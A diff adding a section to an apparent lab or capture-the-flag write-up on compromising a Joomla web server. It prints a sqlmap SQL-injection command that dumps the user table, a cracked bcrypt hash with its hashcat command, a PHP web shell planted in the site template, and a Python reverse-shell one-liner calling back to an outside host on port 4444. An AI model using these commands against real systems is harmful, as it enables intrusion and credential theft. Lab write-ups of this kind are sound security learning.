@@ -27,4 +27,19 @@ The homepage of the webserver showed a Joomla site. Running joomscan against it 
 
 I did a quick search and found an exploit-db entry: https://www.exploit-db.com/exploits/42033
 
-From this I ran the suggested sql map command to test it.
+From this I ran the suggested sql map command to test it, and it worked. Given that the above exploit has the working tests for the blind sql injection, I specified one of those and quickly dumped the user table:
+
+`
+sqlmap -u "http://10.10.69.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --test-filter="MySQL >= 5.0 error-based - Parameter replace (FLOOR)" --random-agent --dump -p list[fullordering]
+`
+
+This gave me the hash for 'jonah': `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`. A standard bcrypt hash. Using hashcat on my windows machine (where my NVidia 2080 lives), I cracked this via `.\hashcat64.exe -m 3200 ..\hash.txt ..\rockyou.txt` (3200 for a bcrypt hash, as indicated by the `$2y`). The password was `spiderman123` :)
+
+## a shell through joomla and escalation
+
+The credentials didn't work for mysql or ssh, but they did log me into Joomla. Once in, I went to the template manager and used it to stick a php shell directly into the index page, placing it just below the heading. Nice.
+
+With this I dropped my handy python reverse shell one liner (below), and got a shell as `apache` on the system:
+
+Python one liner: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.105.239",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
